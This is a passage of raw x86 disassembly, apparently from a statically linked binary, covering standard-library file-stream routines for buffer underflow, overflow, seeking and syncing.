mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804bdd0
mov edx, 0xffffffff
cmp eax, ebx
jne 0x804bda2
jmp 0x804bda0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
test byte [ebx + 1], 0x10
je 0x804be6b
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov edx, dword [ebx + 0x94]
mov eax, dword [arg_10h]
mov dword [esp], ebx
mov dword [var_4h], edi
mov dword [var_8h], eax
call dword [edx + 0x3c]
mov esi, eax
movzx eax, word [ebx + 0x44]
test ax, ax
je 0x804be1d
test esi, esi
jne 0x804be50
mov edx, dword [ebx + 0x5c]
mov eax, dword [ebx + 0x1c]
test edx, edx
mov dword [ebx + 0xc], eax
mov dword [ebx + 4], eax
mov dword [ebx + 8], eax
mov dword [ebx + 0x14], eax
mov dword [ebx + 0x10], eax
jle 0x804be46
mov eax, dword [ebx + 0x20]
mov dword [ebx + 0x18], eax
add esp, 0x10
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
test dword [ebx], 0x202
jne 0x804be39
jmp 0x804be36
movzx eax, ax
mov dword [var_8h], esi
mov dword [var_4h], edi
dec eax
mov dword [esp], eax
call fcn.0804e230
inc eax
mov word [ebx + 0x44], ax
jmp 0x804be1d
mov ecx, dword [ebx + 8]
mov edx, dword [ebx + 0x10]
cmp ecx, edx
je 0x804bdf7
mov eax, dword [ebx + 0x94]
sub edx, ecx
xor esi, esi
mov ecx, edx
mov dword [var_ch], 1
mov dword [var_4h], edx
sar ecx, 0x1f
mov dword [esp], ebx
mov dword [var_8h], ecx
call dword [eax + 0x40]
mov ecx, edx
mov edx, eax
and eax, ecx
inc eax
je 0x804be3c
mov dword [ebx + 0x4c], edx
mov dword [ebx + 0x50], ecx
jmp 0x804bdf7
mov esi, esi
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x1c
mov esi, dword [arg_8h]
mov edx, dword [esi]
test dl, 4
jne 0x804c041
mov eax, dword [esi + 4]
cmp eax, dword [esi + 8]
jb 0x804bfbf
mov ecx, dword [esi + 0x1c]
test ecx, ecx
jne 0x804beee
mov eax, dword [esi + 0x24]
test eax, eax
jne 0x804c02e
mov dword [esp], esi
call fcn.0804dbb0
mov edx, dword [esi]
and edx, 0x202
je 0x804bf5a
mov edx, dword [0x80a9500]
xor ebx, ebx
cmp word [edx], 0
js 0x804bf30
mov eax, 0
test eax, eax
je 0x804bf30
lea eax, [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov ebx, 1
call section.
mov edx, dword [0x80a9500]
nop
cmp word [edx], 0
jns 0x804c01b
mov eax, dword [edx]
and eax, 0x288
cmp eax, 0x280
je 0x804bffc
cmp word [edx], 0
jns 0x804bfef
test ebx, ebx
jne 0x804bfd7
mov dword [esp], esi
call fcn.0804d770
mov edx, dword [esi + 0x20]
mov eax, dword [esi + 0x1c]
mov ecx, dword [esi + 0x94]
sub edx, eax
mov dword [esi + 4], eax
mov dword [esi + 0xc], eax
mov dword [esi + 8], eax
mov dword [esi + 0x18], eax
mov dword [esi + 0x14], eax
mov dword [esi + 0x10], eax
mov dword [esp], esi
mov dword [var_4h], eax
mov dword [var_8h], edx
call dword [ecx + 0x38]
test eax, eax
mov edx, eax
jle 0x804bfc9
add dword [esi + 8], edx
mov eax, 0xffffffff
test edx, edx
je 0x804bfc2
mov ecx, dword [esi + 0x4c]
mov ebx, dword [esi + 0x50]
mov eax, ecx
and eax, ebx
inc eax
je 0x804bfbc
mov eax, edx
cdq
add ecx, eax
adc ebx, edx
mov dword [esi + 0x4c], ecx
mov dword [esi + 0x50], ebx
mov eax, dword [esi + 4]
movzx eax, byte [eax]
add esp, 0x1c
pop ebx
pop esi
leave
ret
jne 0x804bfd0
or dword [esi], 0x10
jmp 0x804bf96
or dword [esi], 0x20
xor edx, edx
jmp 0x804bf96
lea eax, [var_18h]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804bf5a
mov dword [esp], edx
call fcn.08074580
jmp 0x804bf56
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, dword [0x80a9500]
jmp 0x804bf4c
mov dword [esp], edx
call fcn.08074540
mov edx, dword [0x80a9500]
jmp 0x804bf3a
mov dword [esp], eax
call fcn.08051180
and dword [esi], 0xfffffeff
jmp 0x804bee4
or edx, 0x20
mov dword [esi], edx
call fcn.08048b20
mov dword [eax], 9
mov eax, 0xffffffff
jmp 0x804bfc2
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
lea edx, [var_6ch]
push ebx
sub esp, 0xb0
mov esi, dword [arg_8h]
mov eax, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804c095
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x804c100
mov edx, dword [esi + 0x1c]
mov eax, dword [esi + 0x20]
sub eax, edx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08054780
mov edx, 0x80929a0
mov ebx, dword [esi + 0x5c]
mov eax, 0x8092b00
mov dword [esi + 0x20], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 0xc], 0
mov dword [esi + 4], 0
mov dword [esi + 8], 0
test ebx, ebx
cmovg eax, edx
mov dword [esi + 0x94], eax
mov eax, dword [esi + 0x58]
mov dword [eax + 0xb8], edx
mov eax, 1
add esp, 0xb0
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_70h], edx
mov dword [var_74h], eax
or edx, eax
je 0x804c095
cmp dword [var_70h], 0
jg 0x804c095
jl 0x804c129
cmp dword [var_74h], 0xfffff
ja 0x804c095
call fcn.080546b0
mov dword [var_a8h], 0
xor edx, edx
mov edi, eax
add eax, dword [var_74h]
lea ecx, [edi - 1]
adc edx, dword [var_70h]
mov dword [var_78h], ecx
not ecx
mov dword [var_ach], ecx
mov dword [var_7ch], ecx
mov ebx, dword [var_ach]
add eax, 0xffffffff
mov ecx, dword [var_a8h]
adc edx, 0xffffffff
and ebx, eax
mov eax, dword [esi + 0x1c]
mov dword [var_84h], ebx
and ecx, edx
mov ebx, dword [esi + 0x20]
mov dword [var_80h], ecx
xor edx, edx
mov dword [var_a4h], eax
mov dword [var_8ch], eax
mov eax, ebx
mov dword [var_88h], ebx
sub eax, dword [var_a4h]
lea ecx, [edi + eax - 1]
and ecx, dword [var_7ch]
cmp dword [var_80h], edx
jg 0x804c2af
jl 0x804c1b2
cmp dword [var_84h], ecx
jae 0x804c2af
mov eax, edi
add eax, dword [var_40h]
dec eax
and eax, dword [var_7ch]
sub ecx, eax
add eax, dword [var_a4h]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08054780
mov edx, dword [esi + 0x1c]
mov eax, edx
mov dword [var_a4h], edx
add eax, dword [var_40h]
mov dword [esi + 0x20], eax
mov eax, dword [esi + 8]
mov ecx, dword [esi + 0x4c]
sub eax, dword [esi + 4]
mov ebx, dword [esi + 0x50]
mov edi, dword [esi + 0x20]
cdq
sub ecx, eax
mov eax, dword [var_a4h]
sbb ebx, edx
mov dword [esi + 0x4c], ecx
mov dword [esi + 0x50], ebx
mov dword [esi + 0xc], eax
mov eax, edi
sub eax, dword [var_a4h]
cdq
cmp ebx, edx
jg 0x804c2a8
jl 0x804c21e
cmp ecx, eax
jae 0x804c2a8
mov eax, dword [var_a4h]
add eax, dword [esi + 0x4c]
mov dword [esi + 8], edi
mov ebx, dword [esi + 0x50]
mov dword [esi + 4], eax
sub edi, dword [var_a4h]
mov ecx, dword [esi + 0x4c]
mov eax, edi
cdq
cmp ebx, edx
jg 0x804c28d
jl 0x804c246
cmp ecx, edi
jae 0x804c28d
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], edx
mov eax, dword [esi + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ecx, dword [esi + 0x20]
sub ecx, dword [esi + 0x1c]
mov ebx, ecx
mov dword [var_a0h], ecx
xor eax, dword [var_a0h]
sar ebx, 0x1f
mov dword [var_9ch], ebx
mov ecx, dword [var_9ch]
xor ecx, edx
or ecx, eax
je 0x804c294
or dword [esi], 0x20
xor eax, eax
jmp 0x804c0f2
mov eax, dword [var_a0h]
mov edx, dword [var_9ch]
mov dword [esi + 0x4c], eax
mov dword [esi + 0x50], edx
jmp 0x804c28d
mov eax, edi
jmp 0x804c227
mov ecx, dword [var_78h]
xor edx, edx
mov eax, edi
add eax, dword [var_74h]
mov dword [var_a8h], 0
adc edx, dword [var_70h]
not ecx
mov dword [var_ach], ecx
mov dword [var_90h], ecx
mov ebx, dword [var_ach]
add eax, 0xffffffff
mov ecx, dword [var_a8h]
adc edx, 0xffffffff
and ebx, eax
mov dword [var_98h], ebx
and ecx, edx
mov ebx, dword [var_8ch]
sub dword [var_88h], ebx
mov dword [var_94h], ecx
xor edx, edx
mov eax, dword [var_88h]
lea ecx, [edi + eax - 1]
and ecx, dword [var_90h]
cmp dword [var_94h], edx
jl 0x804c363
jg 0x804c326
cmp dword [var_98h], ecx
jbe 0x804c363
mov eax, edi
mov edx, dword [var_8ch]
mov dword [var_ch], 1
add eax, dword [var_40h]
mov dword [var_4h], ecx
mov dword [esp], edx
dec eax
and eax, dword [var_90h]
mov dword [var_8h], eax
call fcn.080548a0
cmp eax, 0xffffffff
mov edx, eax
je 0x804c095
mov dword [esi + 0x1c], eax
jmp 0x804c1d4
mov ecx, dword [var_40h]
add dword [var_8ch], ecx
mov ebx, dword [var_8ch]
mov dword [esi + 0x20], ebx
jmp 0x804c1e0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 4]
cmp eax, dword [ebx + 8]
jae 0x804c39c
movzx eax, byte [eax]
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.0804c060
test eax, eax
jne 0x804c3ba
mov eax, dword [ebx + 4]
cmp eax, dword [ebx + 8]
jb 0x804c394
or dword [ebx], 0x10
mov eax, 0xffffffff
jmp 0x804c397
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
jmp 0x804c397
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x8c
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea edx, [var_6ch]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_sp_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804c40b
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
je 0x804c437
mov esi, dword [edi + 0x5c]
mov edx, 0x80929a0
mov eax, 0x8092b00
test esi, esi
cmovg eax, edx
mov dword [edi + 0x94], eax
mov eax, dword [edi + 0x58]
mov dword [eax + 0xb8], edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_3ch]
mov edx, dword [var_40h]
mov eax, ecx
or eax, edx
je 0x804c40b
test ecx, ecx
jg 0x804c40b
jl 0x804c451
cmp edx, 0xfffff
ja 0x804c40b
mov ebx, dword [edi + 0x4c]
mov esi, dword [edi + 0x50]
mov eax, ebx
and eax, esi
inc eax
je 0x804c468
cmp esi, ecx
jl 0x804c468
jg 0x804c40b
cmp ebx, edx
ja 0x804c40b
mov dword [var_14h], 0
mov dword [var_18h], 0
mov eax, dword [edi + 0x38]
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 1
mov dword [esp], 0
mov dword [var_10h], eax
mov eax, dword [var_40h]
mov dword [var_sp_4h], eax
call fcn.080546f0
mov dword [var_70h], eax
inc eax
je 0x804c40b
mov eax, dword [var_40h]
mov edx, dword [var_3ch]
mov dword [var_sp_ch], 0
mov dword [var_sp_4h], eax
mov dword [var_sp_8h], edx
mov eax, dword [edi + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ebx, dword [var_3ch]
mov ecx, dword [var_40h]
mov esi, edx
xor esi, ebx
xor eax, ecx
or esi, eax
je 0x804c502
mov eax, dword [var_40h]
mov dword [var_sp_4h], eax
mov eax, dword [var_70h]
mov dword [esp], eax
call fcn.08054780
mov dword [edi + 0x50], 0xffffffff
mov dword [edi + 0x4c], 0xffffffff
jmp 0x804c40b
mov eax, dword [var_70h]
mov dword [var_sp_ch], 0
mov dword [esp], edi
add eax, dword [var_40h]
mov dword [var_sp_8h], eax
mov eax, dword [var_70h]
mov dword [var_sp_4h], eax
call fcn.0804db40
mov eax, dword [edi + 0x4c]
mov edx, dword [edi + 0x50]
and eax, edx
inc eax
jne 0x804c53c
mov dword [edi + 0x4c], 0
mov dword [edi + 0x50], 0
mov eax, dword [var_70h]
mov edx, dword [var_3ch]
mov dword [edi + 0xc], eax
add eax, dword [edi + 0x4c]
mov dword [edi + 4], eax
mov eax, dword [var_40h]
add dword [var_70h], eax
mov eax, dword [var_70h]
mov dword [edi + 8], eax
mov eax, dword [var_40h]
mov dword [edi + 0x50], edx
mov edx, 0x8092b60
mov dword [edi + 0x4c], eax
mov eax, dword [edi + 0x5c]
test eax, eax
mov eax, 0x8092a00
cmovg edx, eax
mov eax, dword [edi + 0x58]
mov dword [edi + 0x94], edx
mov dword [eax + 0xb8], 0x8092a00
jmp 0x804c42c
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.0804c3d0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov ebx, dword [var_4h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_ch]
mov esi, dword [arg_8h]
mov edx, dword [esi]
test dl, 8
jne 0x804c75d
test dh, 8
je 0x804c74d
mov ebx, dword [esi + 0x10]
test ebx, ebx
jne 0x804c63b
mov dword [esp], esi
call fcn.0804dbb0
mov eax, dword [esi + 0x1c]
mov edx, dword [esi]
mov dword [esi + 0xc], eax
mov dword [esi + 4], eax
mov dword [esi + 8], eax
test dh, 1
jne 0x804c723
mov ecx, dword [esi + 4]
mov ebx, dword [esi + 0x20]
cmp ecx, ebx
je 0x804c713
mov eax, dword [esi + 8]
mov dword [esi + 0x14], ecx
mov dword [esi + 0x10], ecx
mov dword [esi + 0x18], ebx
mov dword [esi + 4], eax
mov dword [esi + 0xc], eax
mov eax, edx
mov edx, dword [esi + 0x5c]
or ah, 8
mov dword [esi], eax
test edx, edx
jle 0x804c700
cmp edi, 0xffffffff
je 0x804c6e1
mov edx, dword [esi + 0x14]
cmp edx, dword [esi + 0x20]
je 0x804c695
mov eax, edi
mov byte [edx], al
mov eax, dword [esi]
mov edx, dword [esi + 0x14]
inc edx
test al, 2
mov dword [esi + 0x14], edx
jne 0x804c676
test ah, 2
je 0x804c667
cmp edi, 0xa
je 0x804c676
mov eax, edi
movzx edx, al
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi + 0x10]
mov dword [esp], esi
sub edx, eax
mov dword [var_4h], eax
mov dword [var_8h], edx
call fcn.0804bd90
mov edx, 0xffffffff
inc eax
jne 0x804c667
jmp 0x804c66c
mov eax, dword [esi + 0x5c]
test eax, eax
jle 0x804c6ca
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804a340
inc eax
je 0x804c6c3
mov edx, dword [esi + 0x14]
jmp 0x804c64c
mov edx, 0xffffffff
jmp 0x804c66c
mov eax, dword [esi + 0x10]
mov dword [esp], esi
sub edx, eax
mov dword [var_4h], eax
mov dword [var_8h], edx
call fcn.0804bd90
jmp 0x804c6bb
mov edx, dword [esi + 0x10]
mov eax, dword [esi + 0x14]
mov dword [esp], esi
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
mov edx, eax
jmp 0x804c66c
test eax, 0x202
je 0x804c63b
mov dword [esi + 0x18], ecx
jmp 0x804c63b
mov eax, dword [esi + 0x1c]
mov dword [esi + 4], eax
mov dword [esi + 8], eax
mov ecx, eax
jmp 0x804c617
mov ebx, dword [esi + 8]
sub ebx, dword [esi + 4]
mov dword [esp], esi
call fcn.0804d7f0
mov edx, dword [esi + 0xc]
mov eax, edx
sub eax, dword [esi + 0x1c]
cmp eax, ebx
cmova eax, ebx
sub edx, eax
mov dword [esi + 0xc], edx
mov dword [esi + 4], edx
mov edx, dword [esi]
jmp 0x804c609
mov ecx, dword [esi + 0x10]
test ecx, ecx
jne 0x804c600
jmp 0x804c5ea
or edx, 0x20
mov dword [esi], edx
call fcn.08048b20
mov dword [eax], 9
jmp 0x804c6c3
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
xor esi, esi
mov edx, dword [ebx + 0x14]
mov eax, dword [ebx + 0x10]
cmp edx, eax
jbe 0x804c7d8
mov ecx, dword [ebx + 0x5c]
test ecx, ecx
jle 0x804c833
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x10]
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_sp_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.0804a340
test eax, eax
je 0x804c7d8
mov eax, 0xffffffff
mov esi, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov eax, dword [ebx + 4]
mov edx, eax
sub edx, dword [ebx + 8]
jne 0x804c7f4
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov eax, esi
jmp 0x804c7d0
mov eax, dword [ebx + 0x94]
mov ecx, edx
mov dword [esp], ebx
sar ecx, 0x1f
mov dword [var_ch], 1
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], ecx
call dword [eax + 0x40]
and eax, edx
inc eax
je 0x804c822
mov eax, dword [ebx + 4]
mov dword [ebx + 8], eax
jmp 0x804c7e2
call fcn.08048b20
cmp dword [eax], 0x1d
je 0x804c7e2
mov esi, 0xffffffff
jmp 0x804c7f0
sub edx, eax
mov dword [var_sp_4h], eax
mov dword [esp], ebx
mov dword [var_sp_8h], edx
call fcn.0804bd90
jmp 0x804c7c5
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [arg_8h]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov edi, dword [eax + 4]
cmp edi, dword [eax + 8]
je 0x804c8e1
mov dword [var_sp_ch], 0
sub edi, dword [eax + 0x1c]
mov edx, edi
mov dword [var_sp_4h], edi
sar edx, 0x1f
mov dword [var_sp_8h], edx
mov eax, dword [eax + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ecx, dword [arg_8h]
mov esi, edx
mov edi, dword [ecx + 4]
mov ecx, dword [ecx + 0x1c]
mov dword [var_10h], ecx
mov ecx, edi
sub ecx, dword [var_10h]
mov ebx, ecx
xor eax, ecx
sar ebx, 0x1f
xor esi, ebx
or esi, eax
jne 0x804c8d4
sub edi, dword [var_10h]
mov ecx, dword [arg_8h]
mov eax, edi
mov dword [ecx + 0x4c], edi
sar eax, 0x1f
mov dword [ecx + 0x50], eax
mov eax, dword [ecx + 0xc]
mov dword [ecx + 4], eax
mov dword [ecx + 8], eax
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [arg_8h]
or dword [eax], 0x20
mov eax, 0xffffffff
jmp 0x804c8c9
mov edx, dword [arg_8h]
mov edx, dword [edx + 0x1c]
mov dword [var_10h], edx
jmp 0x804c8ad
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xa4
mov dword [var_80h], 0
mov ebx, dword [arg_18h]
mov edi, dword [arg_8h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
mov dword [var_74h], eax
mov eax, dword [edi + 8]
cmp dword [edi + 0xc], eax
mov dword [var_70h], edx
je 0x804cd04
mov edx, dword [edi + 0x10]
mov eax, dword [edi + 0x14]
test ebx, ebx
jne 0x804c941
mov esi, 1
mov dword [var_74h], 0
mov dword [var_70h], 0
cmp eax, edx
ja 0x804c94b
test byte [edi + 1], 8
je 0x804c965
mov dword [esp], edi
call fcn.0804d770
mov ecx, 0xffffffff
test eax, eax
mov edx, 0xffffffff
jne 0x804cbb1
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x804c994
mov eax, dword [edi + 0xc]
test eax, eax
jne 0x804ccf1
mov dword [esp], edi
call fcn.0804dbb0
mov eax, dword [edi + 0x1c]
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
cmp esi, 1
je 0x804cca6
jle 0x804c9a8
cmp esi, 2
je 0x804cc65
test ebx, ebx
mov edx, dword [var_74h]
mov ecx, dword [var_70h]
je 0x804cbb1
mov ecx, dword [edi + 0x4c]
mov ebx, dword [edi + 0x50]
mov dword [var_a0h], ecx
mov dword [var_9ch], ebx
mov eax, dword [var_a0h]
and eax, ebx
inc eax
je 0x804cc5e
mov ebx, dword [edi + 0xc]
test ebx, ebx
mov dword [var_84h], ebx
je 0x804cc5e
mov eax, dword [edi]
test ah, 1
mov dword [var_88h], eax
mov edx, eax
jne 0x804ca70
mov ecx, dword [var_74h]
mov ebx, dword [var_70h]
sub ecx, dword [var_a0h]
mov eax, dword [edi + 8]
sbb ebx, dword [var_9ch]
sub eax, dword [var_84h]
mov dword [var_90h], ecx
mov dword [var_8ch], ebx
mov dword [var_98h], eax
mov ebx, eax
sar ebx, 0x1f
mov ecx, dword [var_98h]
add dword [var_90h], ecx
mov dword [var_94h], ebx
mov ebx, dword [var_94h]
adc dword [var_8ch], ebx
mov eax, dword [var_8ch]
test eax, eax
js 0x804ca70
cmp dword [var_8ch], ebx
jg 0x804ca70
jl 0x804cc00
cmp dword [var_90h], ecx
jbe 0x804cc00
nop
lea esi, [esi]
and edx, 4
jne 0x804cb60
mov eax, dword [edi + 0x20]
mov ebx, dword [var_74h]
sub eax, dword [edi + 0x1c]
mov esi, dword [var_70h]
mov edx, eax
neg edx
mov ecx, edx
and ebx, edx
mov edx, dword [var_74h]
sar ecx, 0x1f
and esi, ecx
mov ecx, dword [var_70h]
sub edx, ebx
mov dword [var_7ch], edx
sbb ecx, esi
cdq
cmp ecx, edx
mov dword [var_78h], ecx
jl 0x804cac4
jg 0x804cab0
cmp dword [var_7ch], eax
jbe 0x804cac4
mov esi, esi
mov ebx, dword [var_74h]
mov esi, dword [var_70h]
mov dword [var_7ch], 0
mov dword [var_78h], 0
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [var_ch], 0
call dword [eax + 0x40]
mov ecx, 0xffffffff
mov esi, edx
mov ebx, eax
mov edx, 0xffffffff
test esi, esi
js 0x804cbb1
xor ecx, ecx
mov eax, dword [var_78h]
or eax, dword [var_7ch]
je 0x804cbc0
mov eax, dword [var_80h]
mov ecx, dword [edi + 0x94]
test eax, eax
jne 0x804cbf5
mov edx, dword [edi + 0x20]
mov eax, dword [edi + 0x1c]
sub edx, eax
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [ecx + 0x38]
cdq
mov ecx, eax
cmp edx, dword [var_78h]
jg 0x804cbc0
jl 0x804cb42
cmp eax, dword [var_7ch]
jae 0x804cbc0
mov ebx, dword [var_7ch]
mov esi, dword [var_78h]
inc ecx
mov dword [var_74h], ebx
mov dword [var_70h], esi
je 0x804cb57
sub dword [var_74h], eax
sbb dword [var_70h], edx
mov esi, 1
lea esi, [esi]
mov dword [esp], edi
call fcn.0804e6b0
mov eax, dword [edi + 0x94]
mov edx, dword [var_74h]
mov dword [esp], edi
mov ecx, dword [var_70h]
mov dword [var_ch], esi
mov dword [var_4h], edx
mov dword [var_8h], ecx
call dword [eax + 0x40]
mov ebx, eax
mov esi, edx
and eax, edx
inc eax
je 0x804cbad
mov eax, dword [edi + 0x1c]
and dword [edi], 0xffffffef
mov dword [edi + 0x4c], ebx
mov dword [edi + 0x50], edx
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov edx, ebx
mov ecx, esi
add esp, 0xa4
mov eax, edx
mov edx, ecx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [edi + 0x1c]
mov eax, dword [var_7ch]
add eax, edx
mov dword [edi + 0xc], edx
mov dword [edi + 0x14], edx
mov dword [edi + 4], eax
mov dword [edi + 0x10], edx
mov dword [edi + 0x18], edx
lea eax, [ecx + edx]
mov dword [edi + 8], eax
mov eax, ecx
cdq
add eax, ebx
adc edx, esi
mov dword [edi + 0x4c], eax
and dword [edi], 0xffffffef
mov dword [edi + 0x50], edx
mov edx, dword [var_74h]
mov ecx, dword [var_70h]
jmp 0x804cbb1
mov edx, dword [var_7ch]
mov eax, dword [edi + 0x1c]
jmp 0x804cb1d
and dword [var_88h], 0xffffffef
mov eax, dword [edi + 0x1c]
mov ebx, dword [var_88h]
mov ecx, dword [var_90h]
mov dword [edi + 0xc], eax
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi], ebx
lea edx, [ecx + eax]
mov dword [edi + 0x18], eax
mov ebx, dword [var_9ch]
mov dword [edi + 4], edx
test ebx, ebx
js 0x804cbed
mov eax, dword [edi + 0x94]
mov edx, dword [var_a0h]
mov dword [esp], edi
mov ecx, dword [var_9ch]
mov dword [var_ch], 0
mov dword [var_4h], edx
mov dword [var_8h], ecx
call dword [eax + 0x40]
jmp 0x804cbed
mov edx, dword [edi]
jmp 0x804ca70
mov eax, dword [edi + 0x94]
lea edx, [var_6ch]
mov dword [esp], edi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804cb60
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
jne 0x804cb60
mov edx, dword [var_40h]
mov ecx, dword [var_3ch]
add dword [var_74h], edx
adc dword [var_70h], ecx
xor esi, esi
jmp 0x804c9a8
mov eax, dword [edi + 8]
mov ecx, dword [edi + 0x50]
sub eax, dword [edi + 4]
cdq
sub dword [var_74h], eax
sbb dword [var_70h], edx
mov edx, dword [edi + 0x4c]
mov eax, edx
and eax, ecx
inc eax
je 0x804cb60
add dword [var_74h], edx
adc dword [var_70h], ecx
xor esi, esi
mov eax, dword [var_70h]
test eax, eax
jns 0x804c9a8
call fcn.08048b20
mov ecx, 0xffffffff
mov edx, 0xffffffff
mov dword [eax], 0x16
jmp 0x804cbb1
mov dword [esp], eax
call fcn.08051180
and dword [edi], 0xfffffeff
jmp 0x804c977
mov edx, dword [edi + 0x10]
mov eax, dword [edi + 0x14]
cmp edx, eax
jne 0x804c92a
mov dword [var_80h], 1
jmp 0x804c92a
mov esi, esi
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov edx, dword [arg_18h]
mov eax, dword [arg_14h]
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
test edx, edx
jne 0x804cd5c
mov edx, dword [arg_8h]
mov esi, dword [arg_8h]
mov eax, dword [edx + 8]
mov ecx, dword [esi + 0x4c]
sub eax, dword [edx + 4]
mov ebx, dword [esi + 0x50]
cdq
sub ecx, eax
sbb ebx, edx
add esp, 0x1c
mov edx, ebx
mov eax, ecx
pop ebx
pop esi
pop edi
leave
ret
cmp eax, 1
je 0x804ce35
jle 0x804cd70
cmp eax, 2
je 0x804ce22
test edi, edi
js 0x804ce08
mov edx, dword [arg_8h]
mov ebx, 0xffffffff
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_8h], edi
mov dword [var_ch], 0
mov dword [var_4h], esi
call dword [eax + 0x40]
mov ecx, 0xffffffff
mov dword [var_14h], eax
mov dword [var_10h], edx
mov eax, dword [var_10h]
test eax, eax
js 0x804cd50
mov ecx, dword [arg_8h]
mov eax, dword [arg_8h]
mov ecx, dword [ecx + 0x20]
mov edx, dword [eax + 0x1c]
mov eax, ecx
mov dword [var_18h], ecx
sub eax, edx
mov ebx, eax
sar ebx, 0x1f
cmp edi, ebx
jl 0x804ce00
jg 0x804cdd0
cmp esi, eax
jbe 0x804ce00
mov ecx, dword [arg_8h]
mov eax, dword [var_18h]
mov dword [ecx + 0xc], edx
mov dword [ecx + 4], eax
mov dword [ecx + 8], eax
mov edx, dword [var_10h]
mov ecx, dword [arg_8h]
mov eax, dword [var_14h]
mov ebx, edi
mov dword [ecx + 0x4c], eax
mov dword [ecx + 0x50], edx
and dword [ecx], 0xffffffef
mov ecx, esi
jmp 0x804cd50
lea esi, [esi]
mov ecx, dword [arg_8h]
lea eax, [esi + edx]
jmp 0x804cdd6
call fcn.08048b20
mov ebx, 0xffffffff
mov ecx, 0xffffffff
mov dword [eax], 0x16
jmp 0x804cd50
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x20]
sub eax, dword [ecx + 0x1c]
cdq
add esi, eax
adc edi, edx
